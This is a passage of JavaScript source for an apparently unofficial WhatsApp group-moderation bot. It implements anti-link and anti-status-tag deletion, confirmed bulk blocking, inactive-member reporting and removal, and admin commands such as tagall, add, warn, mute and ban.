                (text && /https?:\/\/(chat\.whatsapp\.com|wa\.me\/\d+)/i.test(text) && !await isGroupAdmin(sock, jid, senderJid))
              );
              if (isGroupMention) {
                const senderIsAdmin = await isGroupAdmin(sock, jid, senderJid);
                if (!senderIsAdmin) {
                  try { await sock.sendMessage(jid, { delete: msg.key }); } catch(_){}
                  await humanReplyWA(sock, replyJid,
                    `⚠️ @${senderNumber} group mentions/tags are not allowed here.`,
                    {mentionJids:[senderJid], msgKey, quotedMsg:msg}
                  );
                  return;
                }
              }
            }

            // ── Anti-status-tag: delete messages where someone tagged this group in their status ──
            // WhatsApp sends a special groupMentionedMessage or a status-forwarded message
            // when someone mentions the group in their status update. We delete it silently.
            if (gs_gm.antistatus_on) {
              const isStatusTag = !!(
                msg.message?.groupMentionedMessage || msg.message?.groupStatusMentionMessage || msg.message?.statusMentionMessage ||
                msg.message?.extendedTextMessage?.contextInfo?.isForwarded &&
                  msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.some(j => j.endsWith('@g.us')) ||
                // WhatsApp status-mention notification comes as a forwarded message
                // with forwardingScore > 0 and a group JID in mentionedJid
                (msg.message?.extendedTextMessage?.contextInfo?.forwardingScore > 0 &&
                  msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.some(j => j.endsWith('@g.us')))
              );
              if (isStatusTag) {
                const senderIsAdmin = await isGroupAdmin(sock, jid, senderJid);
                if (!senderIsAdmin) {
                  // Silent delete — no warning message, just remove it
                  try { await sock.sendMessage(jid, { delete: msg.key }); } catch(_){}
                  console.log(`[antistatus] deleted status-tag message from @${senderNumber} in ${jid}`);
                  return;
                }
              }
            }
          }

          // ── Group toolkit commands (setname, link, badword, warnlimit, ...) ──
          if (isGroup && isCmd && GT_WA_CMDS.has(cmdWord)) {
            const _gtDone = await gtWaCommand({ sock, jid, replyJid, msg, msgKey, cmdWord, args: waArgs, mentions: allMentionedJids, quoted: quotedParticipant, userId, senderJid, name });
            if (_gtDone) return;
          }

          // ── .blockall / .unblockall — block (or unblock) every member of THIS group (owner only) ──
          if (isGroup && isCmd && ['.blockall','.unblockall'].includes(cmdWord)) {
            const _isMe = isOwner(userId) || msg.key.fromMe;
            if (!_isMe) { await humanReplyWA(sock, replyJid, '❌ owner only.', {msgKey, quotedMsg:msg}); return; }
            const _sub = (waArgs[0] || '').toLowerCase();
            const _unblock = cmdWord === '.unblockall';
            const _num = j => String(j || '').split('@')[0].split(':')[0].replace(/\D/g, '');

            // stop a running job
            if (_sub === 'stop') {
              if (blockAllJobs[jid]) { blockAllJobs[jid].cancel = true; await humanReplyWA(sock, replyJid, '🛑 Stopping after the current contact…', {msgKey, quotedMsg:msg}); }
              else await humanReplyWA(sock, replyJid, 'Nothing is running here.', {msgKey, quotedMsg:msg});
              return;
            }
            if (blockAllJobs[jid]) { await humanReplyWA(sock, replyJid, '⏳ Already running in this group. Use ' + cmdWord + ' stop to cancel.', {msgKey, quotedMsg:msg}); return; }

            try {
              const meta = await sock.groupMetadata(jid);
              // never block yourself, the owner number, or the bot's own ids
              const skip = new Set([_num(sock.user?.id), _num(sock.user?.lid), MY_WA, MY_WA_LID].filter(Boolean));
              const targets = [];
              const seen = new Set();
              for (const p of meta.participants) {
                const pn  = [p.phoneNumber, p.jid, p.id].find(x => x && !/@lid/.test(String(x)));   // real phone JID if WA gives it
                const lid = [p.lid, p.id].find(x => x && /@lid/.test(String(x)));
                const key = _num(pn || lid || p.id);
                if (!key || seen.has(key) || skip.has(key) || (lid && skip.has(_num(lid)))) continue;
                seen.add(key);
                targets.push({ pn, lid, id: p.id, key });
              }

              // helper: is this target on the account's blocklist right now? (matches phone AND lid forms)
              const _keysOf = t => [t.pn, t.lid, t.id].filter(Boolean).map(_num).filter(Boolean);
              const _readBlocklist = async () => { try { return new Set(((await sock.fetchBlocklist()) || []).map(_num)); } catch (e) { return null; } };

              // `.blockall check` — show how many of this group's members are really on your blocklist
              if (_sub === 'check') {
                const bl = await _readBlocklist();
                if (!bl) { await humanReplyWA(sock, replyJid, '❌ Could not read your blocklist from WhatsApp right now. Try again in a minute.', {msgKey, quotedMsg:msg}); return; }
                const blocked = targets.filter(t => _keysOf(t).some(k => bl.has(k)));
                const missing = targets.length - blocked.length;
                await humanReplyWA(sock, replyJid, `🔎 ${blocked.length}/${targets.length} members of this group are on your blocklist${missing ? `\n${missing} are NOT blocked yet — run  ${cmdWord} confirm  again (it only does the missing ones).` : ' ✅ everyone is blocked.'}\n(Your total blocklist: ${bl.size})`, {msgKey, quotedMsg:msg});
                return;
              }

              // step 1: ask for confirmation (valid 60s)
              const pend = pendingBlockAll[jid + '|' + cmdWord];
              if (_sub !== 'confirm' || !pend || Date.now() - pend > 60000) {
                pendingBlockAll[jid + '|' + cmdWord] = Date.now();
                await humanReplyWA(sock, replyJid,
                  `⚠️ This will ${_unblock ? 'UNBLOCK' : 'BLOCK'} ${targets.length} member(s) of "${meta.subject}" on your WhatsApp` +
                  `${_unblock ? '' : ' — they will no longer be able to DM you'}.\n\n` +
                  `Send  ${cmdWord} confirm  within 60 seconds to proceed.\nSend  ${cmdWord} stop  to cancel while it runs, or  ${cmdWord} check  to see how many are really blocked.`,
                  {msgKey, quotedMsg:msg});
                return;
              }
              delete pendingBlockAll[jid + '|' + cmdWord];

              // step 2: run in background with a delay between contacts (avoids WhatsApp rate-limit / ban)
              const already = (await _readBlocklist()) || new Set();
              const isDone  = (t, bl) => _keysOf(t).some(k => bl.has(k));
              const todo = targets.filter(t => _unblock ? isDone(t, already) : !isDone(t, already));
              const job = { cancel: false };
              blockAllJobs[jid] = job;
              await humanReplyWA(sock, replyJid, `⏳ ${_unblock ? 'Unblocking' : 'Blocking'} ${todo.length} member(s) (${targets.length - todo.length} skipped — already ${_unblock ? 'unblocked' : 'blocked'}). Slow on purpose to keep your number safe. I'll verify against your real blocklist at the end…`, {msgKey, quotedMsg:msg});

              (async () => {
                const action = _unblock ? 'unblock' : 'block';
                let firstErr = '';
                // WhatsApp now identifies most accounts by a hidden "LID". Blocking by phone JID alone is rejected
                // with "bad-request" — the block request must carry the LID (plus the phone JID as pn_jid).
                const asLid = l => { l = String(l || ''); return l ? (l.includes('@') ? l.replace(/:.*?@/, '@') : l + '@lid') : null; };
                const resolveLid = async t => {
                  if (t.lid) return (t.lid = asLid(t.lid));
                  if (!t.pn) return null;
                  try { const l = await sock.signalRepository?.lidMapping?.getLIDForPN?.(t.pn); if (l) return (t.lid = asLid(l)); } catch (_) {}
                  try { const r = await sock.onWhatsApp(t.pn); const l = r?.[0]?.lid; if (l) return (t.lid = asLid(l)); } catch (_) {}
                  return null;
                };
                const rawItem = async (jidAttr, pnAttr) => {
                  const attrs = { action, jid: jidAttr };
                  if (pnAttr && !_unblock) attrs.pn_jid = pnAttr;
                  await sock.query({ tag: 'iq', attrs: { xmlns: 'blocklist', to: 's.whatsapp.net', type: 'set' }, content: [{ tag: 'item', attrs }] });
                };
                // try every accepted request shape until one is accepted; returns true if WhatsApp accepted one
                const blockOne = async t => {
                  const lid = await resolveLid(t);
                  const shapes = [];
                  if (lid) shapes.push(() => rawItem(lid, t.pn));                 // LID + pn_jid (what WhatsApp Web sends)
                  if (lid) shapes.push(() => sock.updateBlockStatus(lid, action)); // LID only via Baileys helper
                  if (t.pn) shapes.push(() => sock.updateBlockStatus(t.pn, action)); // legacy phone-JID form
                  for (const run of shapes) {
                    try { await run(); return true; }
                    catch (e) { if (!firstErr) firstErr = `${t.pn || t.lid || t.id}: ${e.message}`; console.error('[blockall]', t.pn || t.lid || t.id, e.message); }
                  }
                  return false;
                };
                const uniq = arr => arr.filter((x, i2, a) => x && a.indexOf(x) === i2);

                // pass 1 — phone JID first, then lid
                for (let i2 = 0; i2 < todo.length; i2++) {
                  if (job.cancel) break;
                  await blockOne(todo[i2]);
                  if ((i2 + 1) % 25 === 0 && i2 + 1 < todo.length) {
                    try { await sock.sendMessage(replyJid, { text: `… ${i2 + 1}/${todo.length} sent` }); } catch (_) {}
                  }
                  await sleep(randomInt(1500, 3000));
                  if ((i2 + 1) % 40 === 0) await sleep(randomInt(8000, 15000));
                }

                // verify against the real blocklist; retry the ones that didn't stick using the OTHER id forms
                let bl = await _readBlocklist();
                let notDone = bl ? todo.filter(t => _unblock ? isDone(t, bl) : !isDone(t, bl)) : [];
                if (bl && notDone.length && !job.cancel) {
                  try { await sock.sendMessage(replyJid, { text: `🔁 ${notDone.length} didn't register — retrying them another way…` }); } catch (_) {}
                  for (const t of notDone) {
                    if (job.cancel) break;
                    await blockOne(t);
                    await sleep(randomInt(1500, 3000));
                  }
                  await sleep(2000);
                  bl = await _readBlocklist();
                  notDone = bl ? todo.filter(t => _unblock ? isDone(t, bl) : !isDone(t, bl)) : notDone;
                }

                delete blockAllJobs[jid];
                let summary;
                if (!bl) {
                  summary = `${job.cancel ? '🛑 Stopped' : '✅ Sent'} all requests, but I could not read your blocklist to verify. Send  ${cmdWord} check  in a minute to see how many stuck.`;
                } else {
                  const okCount = targets.filter(t => _unblock ? !isDone(t, bl) : isDone(t, bl)).length;
                  summary = `${job.cancel ? '🛑 Stopped' : '✅ Finished'} — verified ${_unblock ? 'unblocked' : 'blocked'}: ${okCount}/${targets.length}` +
                    (notDone.length ? `\n⚠️ ${notDone.length} could not be ${_unblock ? 'unblocked' : 'blocked'}${notDone.filter(t => !t.lid).length ? ` (${notDone.filter(t => !t.lid).length} have a hidden ID WhatsApp won't reveal)` : ''}.` : '') +
                    (firstErr ? `\nFirst error: ${firstErr.slice(0, 120)}` : '');
                }
                try { await sock.sendMessage(replyJid, { text: summary }); } catch (_) {}
              })().catch(e => { delete blockAllJobs[jid]; console.error('[blockall]', e.message); });
            } catch (e) {
              delete blockAllJobs[jid];
              await humanReplyWA(sock, replyJid, `❌ ${e.message}`, {msgKey, quotedMsg:msg});
            }
            return;
          }

                    // ── .antilink status — explains exactly why a link was or wasn't deleted ──
          if (isGroup && isCmd && cmdWord === '.antilink' && (waArgs[0] || '').toLowerCase() === 'status') {
            try {
              const _m = await gtWaMeta(sock, jid, true);
              const _on = !!getGroupSettings(jid).antilink_on;
              const _botAdm = gtWaBotIsAdmin(sock, _m);
              const _me = msg.key.fromMe ? 'you (the linked account)' : 'you';
              const _why = (_selfCtx.getStore() || {}).linked ? 'you are the LINKED ACCOUNT owner (exempt)'
                : isOwner(userId) ? 'you are the bot OWNER (owner is exempt)'
                : isSudo(userId) ? 'you are a SUDO user (exempt)'
                : gtWaIsAdmin(_m, senderJid) ? 'you are a GROUP ADMIN (admins are exempt)'
                : 'not exempt — your links WOULD be deleted';
              await humanReplyWA(sock, replyJid,
                `🔗 Anti-link status\n\n• Anti-link: ${_on ? 'ON ✅' : 'OFF ❌ (say "turn on antilink" to enable)'}\n• Bot is group admin: ${_botAdm ? 'YES ✅' : 'NO ❌ — make the linked account admin or it cannot delete'}\n• For ${_me}: ${_why}\n\nTest with a normal member (not owner/admin).`,
                {msgKey, quotedMsg:msg});
            } catch (e) { await humanReplyWA(sock, replyJid, `❌ ${e.message}`, {msgKey, quotedMsg:msg}); }
            return;
          }

          // ── Member activity: .active / .inactive / .kickinactive (also natural language) ──
          // Natural aliases: "show active", "show inactive 7", "kick inactive 7 confirm"
          if (isGroup && !isCmd && text) {
            const _natActive = /^(?:show\s+)?(?:most\s+)?active(?:\s+members?)?\s*(\d+)?$/i.exec(text.trim());
            const _natInactive = /^(?:show\s+)?inactive(?:\s+members?)?\s*(\d+)?$/i.exec(text.trim());
            const _natKickIn = /^kick\s+inactive\s+(\d+)\s+confirm$/i.exec(text.trim());
            if ((_natActive || _natInactive || _natKickIn) && botMentioned) {
              if (_natActive) { text = `.active ${_natActive[1] || ''}`.trim(); }
              else if (_natInactive) { text = `.inactive ${_natInactive[1] || '7'}`.trim(); }
              else if (_natKickIn) { text = `.kickinactive ${_natKickIn[1]} confirm`; }
              // fall through to the isCmd block below by re-evaluating
              const _natCmd = ('.'+text.slice(1).split(/\s+/)[0]).toLowerCase();
              if (['.active','.inactive','.kickinactive'].includes(_natCmd)) {
                const _natArgs = text.split(/\s+/).slice(1);
                const _natHandle = await handleCommand(text, jid, userId, name, rawUserId, allMentionedJids);
                if (_natHandle) { await humanReplyWA(sock, replyJid, _natHandle, {msgKey, quotedMsg:msg}); return; }
              }
            }
          }
          if (isGroup && isCmd && ['.active', '.inactive', '.kickinactive'].includes(cmdWord)) {
            const _isAdm = isGroupMod(userId) || !!msg.key.fromMe || await isGroupAdmin(sock, jid, senderJid);
            if (cmdWord !== '.active' && !_isAdm) { await humanReplyWA(sock, replyJid, '❌ admins/sudo only.', {msgKey, quotedMsg:msg}); return; }
            try {
              jaFlush();
              const meta = await gtWaMeta(sock, jid, true);
              const since = jaGetSince(jid);
              const idsOf = p => [p.id, p.lid, p.phoneNumber, p.jid].filter(Boolean).map(_gtDigits).filter(Boolean);
              const byD = new Map(db.prepare('SELECT digits, msgs, last_ts FROM member_activity WHERE group_id=?').all(jid).map(r => [r.digits, r]));
              const own = [sock.user?.id, sock.user?.lid].map(_gtDigits).filter(Boolean);
              const info = (meta.participants || []).map(p => {
                const ds = idsOf(p); let msgs = 0, last = 0;
                for (const d of ds) { const r = byD.get(d); if (r) { msgs += r.msgs; last = Math.max(last, r.last_ts); } }
                return { p, ds, msgs, last, isBot: ds.some(d => own.includes(d)) };
              }).filter(x => !x.isBot);
              const tag = x => '@' + _gtDigits(x.p.id);
              const sinceStr = new Date(since).toISOString().slice(0, 10);

              if (cmdWord === '.active') {
                const n = Math.min(Math.max(parseInt(waArgs[0]) || 10, 1), 30);
                const top = info.filter(x => x.msgs > 0).sort((a, b) => b.msgs - a.msgs).slice(0, n);
                if (!top.length) { await humanReplyWA(sock, replyJid, `📊 No messages recorded yet (I started watching this group on ${sinceStr}).`, {msgKey, quotedMsg:msg}); return; }
                await humanReplyWA(sock, replyJid, `📊 *MOST ACTIVE MEMBERS*\n(since ${sinceStr})\n\n` + top.map((x, i) => `${i + 1}. ${tag(x)} — ${x.msgs} msg${x.msgs === 1 ? '' : 's'}`).join('\n'), {mentionJids: top.map(x => x.p.id), msgKey, quotedMsg:msg});
                return;
              }

              // .inactive / .kickinactive <days>
              const days = Math.min(Math.max(parseInt(waArgs[0]) || 7, 1), 365);
              const cutoff = Date.now() - days * 86400000;
              if (since > cutoff) {
                const tracked = Math.floor((Date.now() - since) / 86400000);
                await humanReplyWA(sock, replyJid, `⏳ I've only been watching this group for ${tracked} day${tracked === 1 ? '' : 's'} (since ${sinceStr}), so I can't judge ${days} days yet.\n${tracked >= 1 ? `Try saying "show inactive ${tracked}"` : 'Check back later when I have more data'}.`, {msgKey, quotedMsg:msg});
                return;
              }
              const isProtected = x => !!x.p.admin || x.ds.some(d => { try { return isOwner(resolveId('wa_' + d)) || isSudo(resolveId('wa_' + d)); } catch (_) { return false; } })
                || x.ds.includes(String(MY_WA).replace(/\D/g, ''));
              const quiet = info.filter(x => !isProtected(x) && (x.last ? x.last < cutoff : true));

              if (cmdWord === '.inactive') {
                if (!quiet.length) { await humanReplyWA(sock, replyJid, `✅ Everyone (except admins) has been active in the last ${days} day${days === 1 ? '' : 's'}.`, {msgKey, quotedMsg:msg}); return; }
                const shown = quiet.slice(0, 60);
                const ago = x => x.last ? Math.floor((Date.now() - x.last) / 86400000) + 'd ago' : 'never seen';
                await humanReplyWA(sock, replyJid, `😴 *INACTIVE ${days}+ DAYS* (${quiet.length})\n(admins not counted)\n\n` + shown.map((x, i) => `${i + 1}. ${tag(x)} — ${ago(x)}`).join('\n') + (quiet.length > shown.length ? `\n…and ${quiet.length - shown.length} more` : '') + `\n\nTo remove them, say "kick inactive ${days} confirm"`, {mentionJids: shown.map(x => x.p.id), msgKey, quotedMsg:msg});
                return;
              }

              // .kickinactive <days> confirm
              if (!quiet.length) { await humanReplyWA(sock, replyJid, `✅ Nobody to remove — everyone (except admins) has been active in the last ${days} day${days === 1 ? '' : 's'}.`, {msgKey, quotedMsg:msg}); return; }
              if (!gtWaBotIsAdmin(sock, meta)) { await humanReplyWA(sock, replyJid, `⚠️ I can't remove people because the linked account is not a group admin. Make it admin first.`, {msgKey, quotedMsg:msg}); return; }
              if (!waArgs.map(a => String(a).toLowerCase()).includes('confirm')) {
                await humanReplyWA(sock, replyJid, `⚠️ ${quiet.length} member${quiet.length === 1 ? '' : 's'} with no messages in ${days}+ days would be removed (max 30 per run).\nAdmins, you and the bot are never removed.\n\nTo confirm, say: "kick inactive ${days} confirm"\nTo see them first, say: "show inactive ${days}"`, {msgKey, quotedMsg:msg});
                return;
              }
              const batch = quiet.slice(0, 30);
              let removed = 0;
              for (let i = 0; i < batch.length; i += 5) {
                const part = batch.slice(i, i + 5).map(x => x.p.id);
                try { await sock.groupParticipantsUpdate(jid, part, 'remove'); removed += part.length; } catch (e) { console.error('[kickinactive]', e.message); }
                await sleep(3000);   // gentle pacing (anti-ban)
              }
              gtWaMetaInvalidate(jid);
              await humanReplyWA(sock, replyJid, `🧹 Removed ${removed} inactive member${removed === 1 ? '' : 's'} (${days}+ days quiet).${quiet.length > batch.length ? `\n${quiet.length - batch.length} more left — send the command again to continue.` : ''}`, {msgKey, quotedMsg:msg});
            } catch (e) { await humanReplyWA(sock, replyJid, `❌ ${e.message}`, {msgKey, quotedMsg:msg}); }
            return;
          }

          // ── Group admin commands ─────────────────────────────────────
          const GROUP_ADMIN_CMDS = ['.kick','.ban','.promote','.demote','.mute','.unmute','.warn','.add','.tagall','.lock','.unlock','.groupinfo'];
          if(isGroup&&isCmd&&GROUP_ADMIN_CMDS.includes(cmdWord)){
            const allowed=isGroupMod(userId)||!!msg.key.fromMe||await isGroupAdmin(sock,jid,senderJid);

            // .groupinfo & .tagall don't need admin
            if (cmdWord === '.groupinfo') {
              try {
                const meta = await sock.groupMetadata(jid);
                // Resolve @lid → real phone number where WhatsApp provides it, so admins are readable + taggable
                const adminList = meta.participants.filter(p=>p.admin);
                const _realJid = p => [p.phoneNumber, p.jid, p.id].find(x => x && !/@lid/.test(String(x))) || p.id;
                const admins = adminList.map(p=>`${p.admin==='superadmin'?'👑':'⭐'} @${String(_realJid(p)).split('@')[0].split(':')[0]}`).join('\n');
                const _adminMentions = adminList.map(p=>_realJid(p));
                const gs = getGroupSettings(jid);
                const reply = `ℹ️ GROUP INFO\n\n📛 ${meta.subject}\n👥 Members: ${meta.participants.length}\n👑 Admins:\n${admins}\n🔒 Locked: ${gs.locked?'Yes':'No'}\n🔗 Antilink: ${gs.antilink_on?'On':'Off'}\n👥 Anti-GM: ${gs.antigm_on?'On':'Off'}\n📛 Anti-Status: ${gs.antistatus_on?'On':'Off'}\n🎉 Welcome: ${gs.welcome_on?'On':'Off'}`;
                await sock.sendMessage(replyJid, { text: reply, mentions: _adminMentions }, { quoted: msg });
              } catch(e) { await humanReplyWA(sock, replyJid, `❌ ${e.message}`, {msgKey, quotedMsg:msg}); }
              return;
            }

            if (cmdWord === '.tagall') {
              if (!allowed) { await humanReplyWA(sock,replyJid,'❌ admins/sudo only.',{msgKey, quotedMsg:msg}); return; }
              if (!isSudo(userId)) {
                const _left = 60000 - (Date.now() - (global._tagallLast?.[jid] || 0));
                if (_left > 0) { await humanReplyWA(sock, replyJid, `\u23f3 .tagall is on cooldown \u2014 wait ${Math.ceil(_left / 1000)}s.`, {msgKey, quotedMsg:msg}); return; }
              }
              (global._tagallLast = global._tagallLast || {})[jid] = Date.now();
              try {
                const meta = await sock.groupMetadata(jid);
                const members = meta.participants;
                const mentions = members.map(p => p.id);
                const caption = waArgs.join(' ') || '📢 Attention everyone!';
                // Split into chunks of 50 mentions to avoid WA limits
                const CHUNK = 250;
                if (members.length <= CHUNK) {
                  const tags = members.map(p => `@${String(p.id).split('@')[0].split(':')[0]}`).join('\n');
                  await sock.sendMessage(replyJid, { text: `${caption}\n\n${tags}`, mentions });
                } else {
                  await sock.sendMessage(replyJid, { text: caption, mentions });
                  for (let i = 0; i < members.length; i += CHUNK) {
                    const chunk = members.slice(i, i + CHUNK);
                    const chunkMentions = chunk.map(p => p.id);
                    const chunkTags = chunk.map(p => `@${String(p.id).split('@')[0].split(':')[0]}`).join('\n');
                    await sock.sendMessage(replyJid, { text: chunkTags, mentions: chunkMentions });
                    await sleep(1000);
                  }
                }
              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            if (cmdWord === '.lock') {
              if (!allowed) { await humanReplyWA(sock,replyJid,'❌ admins/sudo only.',{msgKey, quotedMsg:msg}); return; }
              try {
                await sock.groupSettingUpdate(jid, 'announcement');
                setGroupSetting(jid, 'locked', 1);
                await humanReplyWA(sock, replyJid, '🔒 Group locked. Only admins can send messages.', {msgKey, quotedMsg:msg});
              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            if (cmdWord === '.unlock') {
              if (!allowed) { await humanReplyWA(sock,replyJid,'❌ admins/sudo only.',{msgKey, quotedMsg:msg}); return; }
              try {
                await sock.groupSettingUpdate(jid, 'not_announcement');
                setGroupSetting(jid, 'locked', 0);
                await humanReplyWA(sock, replyJid, '🔓 Group unlocked. Everyone can send messages.', {msgKey, quotedMsg:msg});
              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            if (cmdWord === '.add') {
              if (!allowed) { await humanReplyWA(sock,replyJid,'❌ admins/sudo only.',{msgKey, quotedMsg:msg}); return; }
              // Targets: numbers typed after .add (several allowed), @mentions, or the person whose message you replied to
              const _addSet = new Set();
              for (const a of waArgs) { const d = String(a).replace(/\D/g, ''); if (d.length >= 7 && d.length <= 15) _addSet.add(d); }
              let _am = null; try { _am = await gtWaMeta(sock, jid, true); } catch (_) {}
              const _addFromJid = j => { const p = _am ? gtWaFind(_am, j) : null; return _gtDigits((p && (p.phoneNumber || p.jid)) || j); };
              if (!_addSet.size) {
                for (const j of allMentionedJids || []) { const d = _addFromJid(j); if (d) _addSet.add(d); }
                if (!_addSet.size && quotedParticipant) { const d = _addFromJid(quotedParticipant); if (d) _addSet.add(d); }
              }
              const _addNums = [..._addSet].slice(0, 10);
              if (!_addNums.length) { await humanReplyWA(sock,replyJid,'\u274c .add <number with country code>\nExample: .add 2348012345678\n(you can type several numbers, or reply to someone\'s message)',{msgKey, quotedMsg:msg}); return; }
              try {
                if (!_am || !gtWaBotIsAdmin(sock, _am)) { await humanReplyWA(sock, replyJid, `⚠️ I can't add people because the linked account is not a group admin. Make it admin first.`, {msgKey, quotedMsg:msg}); return; }
                const lines = [];
                for (const num of _addNums) {
                  if (_am && gtWaFind(_am, num + '@s.whatsapp.net')) { lines.push(`▸ +${num}: already in this group`); continue; }
                  try {
                    const res = await sock.groupParticipantsUpdate(jid, [num + '@s.whatsapp.net'], 'add');
                    const st = String((res && res[0] && res[0].status) || '200');
                    if (st === '200') lines.push(`▸ +${num}: added ✅`);
                    else if (st === '409') lines.push(`▸ +${num}: already in this group`);
                    else if (st === '403' || st === '408') {
                      // privacy settings block direct adds (403) or they left recently (408) → send them the invite link privately
                      let sent = false;
                      try { const code = await sock.groupInviteCode(jid); await sock.sendMessage(num + '@s.whatsapp.net', { text: `You were invited to join *${_am?.subject || 'a group'}*:\nhttps://chat.whatsapp.com/${code}` }); sent = true; } catch (_) {}
                      lines.push(`▸ +${num}: ${st === '403' ? "their privacy settings don't allow direct adds" : 'they left recently, so WhatsApp blocked the add'}${sent ? ' — I sent them the invite link 📩' : ' — could not send the invite link'}`);
                    }
                    else if (st === '401') lines.push(`▸ +${num}: couldn't add (this number has blocked the bot)`);
                    else if (st === '404') lines.push(`▸ +${num}: this number is not on WhatsApp`);
                    else lines.push(`▸ +${num}: couldn't add (code ${st})`);
                  } catch (e) { lines.push(`▸ +${num}: couldn't add — ${e.message}`); }
                  if (_addNums.length > 1) await sleep(2500);   // gentle pacing between adds (anti-ban)
                }
                gtWaMetaInvalidate(jid);
                await humanReplyWA(sock, replyJid, `➕ *ADD*\n${lines.join('\n')}`, {msgKey, quotedMsg:msg});
              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            // These actions only work if the linked account is a group admin — say so instead of failing silently
            if (allowed && ['.kick','.ban','.promote','.demote','.lock','.unlock','.add'].includes(cmdWord)) {
              try {
                const _bm = await gtWaMeta(sock, jid);
                if (!gtWaBotIsAdmin(sock, _bm)) {
                  await humanReplyWA(sock, replyJid, `⚠️ I can't do ${cmdWord} because the linked account is not a group admin. Make it admin first.`, {msgKey, quotedMsg:msg});
                  return;
                }
              } catch(_) {}
            }
            if(!allowed){await humanReplyWA(sock,replyJid,'\u274c admins/sudo only.',{msgKey, quotedMsg:msg});return;}
            const targetJid=allMentionedJids[0]||quotedParticipant;
            if(!targetJid){await humanReplyWA(sock,replyJid,'\u274c mention someone (or reply to them) e.g. '+cmdWord+' @number',{msgKey, quotedMsg:msg});return;}
            const tNum=_gtDigits(targetJid);
            // owner / sudo / the linked account may act on admins; ordinary group admins may not
            const _powerful = isSudo(userId) || !!msg.key.fromMe || !!(_selfCtx.getStore() || {}).linked;
            if (['.kick','.ban','.demote','.warn','.mute'].includes(cmdWord)) {
              if (tNum && tNum === _gtDigits(senderJid)) { await humanReplyWA(sock, replyJid, `\u274c you can't ${cmdWord.slice(1)} yourself.`, {msgKey, quotedMsg:msg}); return; }
              let _rid = null; try { _rid = resolveId('wa_' + tNum); } catch (_) {}
              if (_rid && (isOwner(_rid) || isSudo(_rid)) && !isOwner(userId) && !msg.key.fromMe) {
                await humanReplyWA(sock, replyJid, `\u274c @${tNum} is protected (owner/sudo).`, {mentionJids:[targetJid], msgKey, quotedMsg:msg}); return;
              }
              try {
                const _pm = await gtWaMeta(sock, jid);
                const _tp = gtWaFind(_pm, targetJid);
                if (_tp && _tp.admin === 'superadmin') { await humanReplyWA(sock, replyJid, `\u274c @${tNum} created this group, so I can't ${cmdWord.slice(1)} them.`, {mentionJids:[targetJid], msgKey, quotedMsg:msg}); return; }
                if (_tp && _tp.admin && !_powerful) { await humanReplyWA(sock, replyJid, `\u274c @${tNum} is a group admin. Only the owner, sudo or the linked account can ${cmdWord.slice(1)} an admin.`, {mentionJids:[targetJid], msgKey, quotedMsg:msg}); return; }
              } catch (_) {}
            }
            // never let a command remove/demote the bot's own account or the owner
            if (['.kick','.ban','.demote'].includes(cmdWord)) {
              const _protect = [_gtDigits(sock.user?.id), _gtDigits(sock.user?.lid), MY_WA.replace(/\D/g,''), MY_WA_LID].filter(Boolean);
              if (_protect.includes(tNum)) { await humanReplyWA(sock, replyJid, `❌ I won't ${cmdWord.slice(1)} the bot account or the owner.`, {msgKey, quotedMsg:msg}); return; }
            }
            // JID form the WhatsApp API expects for this participant (can be @lid in newer groups)
            let apiJid = targetJid, _tMeta = null;
            try { _tMeta = await gtWaMeta(sock, jid, true); apiJid = gtWaApiJid(_tMeta, targetJid); } catch(_){}

            if (cmdWord === '.warn') {
              const reason = waArgs.slice(1).join(' ') || waArgs.join(' ') || 'no reason given';
              const targetUserId = 'wa_' + tNum;
              const warnCount = addWarning(jid, targetUserId, reason, userId);
              const _wl = gtWarnLimit(jid);
              let reply = `⚠️ @${tNum} has been warned. (${warnCount}/${_wl} warnings)\nReason: ${reason}`;
              if (warnCount >= _wl) {
                try {
                  await sock.groupParticipantsUpdate(jid, [apiJid], 'remove');
                  clearWarnings(jid, targetUserId);
                  reply += `\n\n🚫 Auto-kicked after ${_wl} warnings.`;
                } catch(_){}
              }
              await humanReplyWA(sock, replyJid, reply, {mentionJids:[targetJid], msgKey, quotedMsg:msg});
              return;
            }

            if (cmdWord === '.mute') {
              // 'restrict' is not a valid Baileys participant action, so mutes are enforced bot-side:
              // the muted member's messages are deleted (bot must be a group admin).
              try {
                const _m = _tMeta || await gtWaMeta(sock, jid, true);
                if (gtWaIsAdmin(_m, targetJid)) { await humanReplyWA(sock, replyJid, `❌ can't mute a group admin.`, {msgKey, quotedMsg:msg}); return; }
                const _dArg = waArgs.find(a => gtParseDuration(a));
                const _dur = _dArg ? gtParseDuration(_dArg) : null;
                gtMuteAdd(jid, gtWaKey(_m, targetJid), _dur ? Date.now() + _dur : 0, userId, '');
                let _note = gtWaBotIsAdmin(sock, _m) ? '' : `\n⚠️ I'm not a group admin, so I can't delete their messages yet. Make me admin.`;
                await humanReplyWA(sock, replyJid, `🔇 @${tNum} muted ${_dur ? 'for ' + gtFmtDuration(_dur) : 'until unmuted'}. Their messages will be deleted.${_note}`, {mentionJids:[targetJid], msgKey, quotedMsg:msg});
              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${gtErr(e)}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            if (cmdWord === '.unmute') {
              try {
                const _m = _tMeta || await gtWaMeta(sock, jid, true);
                gtMuteRemove(jid, gtWaKey(_m, targetJid));
                await humanReplyWA(sock, replyJid, `🔊 @${tNum} has been unmuted.`, {mentionJids:[targetJid], msgKey, quotedMsg:msg});
              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${gtErr(e)}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            if (cmdWord === '.ban') {
              try {
                const _m = _tMeta || await gtWaMeta(sock, jid, true);
                await sock.groupParticipantsUpdate(jid, [apiJid], 'remove');
                gtBanAdd(jid, gtWaKey(_m, targetJid), waArgs.slice(1).join(' '), userId);
                await humanReplyWA(sock, replyJid, `🚫 @${tNum} has been banned. If they rejoin I'll remove them again (.unban to lift).`, {mentionJids:[targetJid], msgKey, quotedMsg:msg});
